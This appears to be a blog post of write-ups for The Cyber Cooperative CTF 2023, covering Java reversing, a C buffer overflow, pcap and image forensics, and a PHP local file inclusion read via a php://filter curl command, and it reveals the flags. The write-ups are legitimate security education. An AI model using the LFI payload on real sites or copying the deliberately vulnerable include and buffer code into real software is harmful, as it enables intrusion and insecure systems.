---
title: "[CTF] The Cyber Cooperative CTF 2023"
date: 2023-12-19T11:34:01+07:00
draft: false
---

# The Cyber Cooperative CTF 2023

Link: [CTFtime.org](https://ctftime.org/event/2206)

## reversing

### bunker

> You reach a large metal door. It's protected by large yellow bars. There appears to be an panel with a keypad...

In this challenge, we were provided with the Bunker.jar file. To open this file, I utilized jadx-gui.

```
package defpackage;

import java.awt.Component;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JTextField;
import javax.swing.UIManager;

/* compiled from: bunker.java */
/* renamed from: Bunker  reason: default package */
/* loaded from: Bunker.jar:Bunker.class */
class Bunker extends JFrame implements ActionListener {
    static JFrame f;
    static JTextField l;
    String output = "";

    Bunker() {
    }

    public static void main(String[] strArr) {
        f = new JFrame("Bunker");
        try {
            UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
        } catch (Exception e) {
            System.err.println(e.getMessage());
        }
        Bunker bunker = new Bunker();
        l = new JTextField(8);
        l.setEditable(false);
        JButton jButton = new JButton("0");
        JButton jButton2 = new JButton("1");
        JButton jButton3 = new JButton("2");
        JButton jButton4 = new JButton("3");
        JButton jButton5 = new JButton("4");
        JButton jButton6 = new JButton("5");
        JButton jButton7 = new JButton("6");
        JButton jButton8 = new JButton("7");
        JButton jButton9 = new JButton("8");
        JButton jButton10 = new JButton("9");
        JPanel jPanel = new JPanel();
        jButton.addActionListener(bunker);
        jButton2.addActionListener(bunker);
        jButton3.addActionListener(bunker);
        jButton4.addActionListener(bunker);
        jButton5.addActionListener(bunker);
        jButton6.addActionListener(bunker);
        jButton7.addActionListener(bunker);
        jButton8.addActionListener(bunker);
        jButton9.addActionListener(bunker);
        jButton10.addActionListener(bunker);
        jPanel.add(l);
        jPanel.add(jButton);
        jPanel.add(jButton2);
        jPanel.add(jButton3);
        jPanel.add(jButton4);
        jPanel.add(jButton5);
        jPanel.add(jButton6);
        jPanel.add(jButton7);
        jPanel.add(jButton8);
        jPanel.add(jButton9);
        jPanel.add(jButton10);
        f.add(jPanel);
        f.setSize(120, 500);
        f.show();
    }

    public void actionPerformed(ActionEvent actionEvent) {
        this.output += actionEvent.getActionCommand();
        l.setText(this.output);
        if (this.output.length() == 8) {
            System.err.print("USER ENTERED: ");
            System.err.println(this.output);
            l.setText("");
            if (this.output.equals("72945810")) {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < "Q^XSNZD^\\WKk\u0004\tnCVKJkTOPYCm_AGLYUEmPZFLCETFP[[E".length(); i++) {
                    sb.append((char) ("Q^XSNZD^\\WKk\u0004\tnCVKJkTOPYCm_AGLYUEmPZFLCETFP[[E".charAt(i) ^ this.output.charAt(i % this.output.length())));
                }
                JOptionPane.showMessageDialog((Component) null, sb.toString());
            } else {
                JOptionPane.showMessageDialog((Component) null, "=== BUNKER CODE INVALID ===");
            }
            this.output = "";
        }
    }
}
```

The code above seems a simple interactive program where the users enters an 8-digit code, and if the code is correct, a decrypted message is displayed.
The encryption is essentially a simple XOR operation between each character of the hardcoded encrypted string and the corresponding character of the user-entered code.

I wrote a solver to solve this challenge:

```
def solve_bunker_code(user_input):
    if user_input == "72945810":
        encrypted_string = "Q^XSNZD^\\WKk\u0004\tnCVKJkTOPYCm_AGLYUEmPZFLCETFP[[E"
        decrypted_result = ''.join(chr(ord(encrypted_string[i]) ^ ord(user_input[i % len(user_input)])) for i in range(len(encrypted_string)))
        return decrypted_result
    else:
        return "=== BUNKER CODE INVALID ==="

if __name__ == "__main__":
    user_input = input("Enter the bunker code: ")

    if len(user_input) == 8 and user_input.isdigit():
        result = solve_bunker_code(user_input)
        print(result)
    else:
        print("Invalid input. Please enter an 8-digit numeric code.")
```

It checks if the user input matches a specific code ("72945810"). If it does, it performs a decryption operation on the encrypted string "Q^XSNZD^\WKk\u0004\tnCVKJkTOPYCm_AGLYUEmPZFLCETFP[[E" using the XOR (^) operation with characters from the user input. The decrypted result is then returned.


The decrypted result: flag{bunker_11_says_await_further_instruction}

## exploitation

### crashme

> Can you make this program crash?

In this challenge, we were provided with a service accessible via the `nc` command at `0.cloud.chals.io` on port `17289`, along with the files `crashme` and `crashme.c`.

crashme.c:

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
    char buffer[32];
    printf("Give me some data: \n");
    fflush(stdout);
    fgets(buffer, 64, stdin);
    printf("You entered %s\n", buffer);
    fflush(stdout);
    return 0;
}
```

The provided code is a simple C program that reads input from the user and prints it back to the console.
Based on title's challenge, we could try make this program crash.
To crash the program, you can provide more than 32 characters of input when prompted. Since the buffer is only 32 bytes, providing more data will overflow the buffer.

For example, inputting 40 characters might look like this:
![crashme-flag](https://gcdnb.pbrd.co/images/BxAHd89v3GEE.png?o=1)

flag{segfaults_a_hackers_best_friend}

## forensics

### Lost at Sea

> I dropped my flag in the sea. Help me find it among the sharks!

We were given the file `lost-at-sea.pcapng` to unravel this challenge.
To solve this challenge, I used strings and grep commmands, executing the following:
`strings lost-at-sea.pcapng | grep "flag"`

![las-flag](https://gcdnb.pbrd.co/images/rx11bRGH0V3Q.png)

We can also analyze this file using Wireshark. 
Upon opening the file, you will observe an HTTP request using utilizing the GET method. 

`GET /flag%7Bb4by_5h4rk_do0_d0o_d00_d0o_d0o_1n_th3_s34%7D HTTP/1.1`

![wireshark-img](https://gcdnb.pbrd.co/images/17kLca80Seq3.png?o=1)

The path of the requested resource appears to be a flag, with `%7B` and `%7D` being URL-encoded characters representing `{` and `}` respectively.

flag{b4by_5h4rk_do0_d0o_d00_d0o_d0o_1n_th3_s34}

### babyhide

> This little baby is figuring out how to computer! It looks like the baby hid some of my files though. I have no idea what to do, can you get my files back?

We were given `babyhide.jpeg` file in this challenge.
To solve this challenge, I analyze the metadata using exiftool.

```
ExifTool Version Number         : 12.40
File Name                       : babyhide.jpeg
Directory                       : .
File Size                       : 122 KiB
File Modification Date/Time     : 2023:12:16 11:36:43+07:00
File Access Date/Time           : 2023:12:19 09:22:03+07:00
File Inode Change Date/Time     : 2023:12:16 11:36:43+07:00
File Permissions                : -rwxr-xr-x
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Profile CMM Type                : Linotronic
Profile Version                 : 2.1.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 1998:02:09 06:49:00
Profile File Signature          : acsp
Primary Platform                : Microsoft Corporation
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : Hewlett-Packard
Device Model                    : sRGB
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Hewlett-Packard
Profile ID                      : 0
Profile Copyright               : Copyright (c) 1998 Hewlett-Packard Company
Profile Description             : sRGB IEC61966-2.1
Media White Point               : 0.95045 1 1.08905
Media Black Point               : 0 0 0
Red Matrix Column               : 0.43607 0.22249 0.01392
Green Matrix Column             : 0.38515 0.71687 0.09708
Blue Matrix Column              : 0.14307 0.06061 0.7141
Device Mfg Desc                 : IEC http://www.iec.ch
Device Model Desc               : IEC 61966-2.1 Default RGB colour space - sRGB
Viewing Cond Desc               : Reference Viewing Condition in IEC61966-2.1
Viewing Cond Illuminant         : 19.6445 20.3718 16.8089
Viewing Cond Surround           : 3.92889 4.07439 3.36179
Viewing Cond Illuminant Type    : D50
Luminance                       : 76.03647 80 87.12462
Measurement Observer            : CIE 1931
Measurement Backing             : 0 0 0
Measurement Geometry            : Unknown
Measurement Flare               : 0.999%
Measurement Illuminant          : D65
Technology                      : Cathode Ray Tube Display
Red Tone Reproduction Curve     : (Binary data 2060 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 2060 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 2060 bytes, use -b option to extract)
Image Width                     : 1280
Image Height                    : 853
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1280x853
Megapixels                      : 1.1
```
Based on the provided output from ExifTool, there is no explicit indication of hidden data or images within the image file.
Then, I am using strings command to inspect an image file for any suspicious data.

`strings -n 10 -t x babyhide.jpeg | less`

![strings-babyhide](https://gcdnb.pbrd.co/images/TqtJcdOrwSZ4.png?o=1)

Upon inspecting the image file, it's appear to be a snippet of PDF document's internal structure.
Hence, we can use stegano tools to extract the PDF from this image file. We could utilize steghide/stegseek/binwalk.
In this case, I use binwalk to extract the hidden file.

`binwalk -e babyhide.jpeg`

![binwalk-result](https://gcdnb.pbrd.co/images/CcuSrLHYhovs.png?o=1)

Opening the flag, we will get the flag:

![babyhide-flag](https://gcdnb.pbrd.co/images/Yq5risQBfq6p.png?o=1)

flag{baby_come_back}

## web

### Leaky Site

> Try to get source of main_page.

```
<?php
    if(isset($_GET['resource'])){
        include($_GET['resource'] . '.php');
    } else {
        header("Location: /index.php?resource=main_page");
    }
?>
```

Link: https://thecybercoopctf-leaky-site.chals.io/

If we see the code above, there is an `include` function that has a vulnerability to Local File Inclusion.
One of the Local File Inclusion (LFI) techniques that can be used is by using `php://filter`.
The challenge asked us to get the source of main_page, hence we could utilize the `php://filter` stream wrapper for base64 encoding:

`curl https://thecybercoopctf-leaky-site.chals.io/index.php?resource=php://filter/convert.base64-encode/resource=main_page | base64 -d`

We could see the response as follows:

```
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Main</title>
    <link rel="stylesheet" href="https://unpkg.com/@ctfdio/picocss-themes@0.0.3/dist/css/picostrap.min.css">
    </head>
    <body>
        <div class="container my-5">
            <h3>There's a flag here but it's in the source code...</h3>
            <p>
                Can you pull it out?
                <pre>
                    <?php // "flag{0h_n0_php_y0ur_l3aking_4ll_0ver}" ?>
                </pre>
                PHP is quite weird about filters I hear...
            </p>
        </div>
    </body>
</html>
```

The PHP comment within the `<pre>` tag contains a flag:
flag{0h_n0_php_y0ur_l3aking_4ll_0ver}
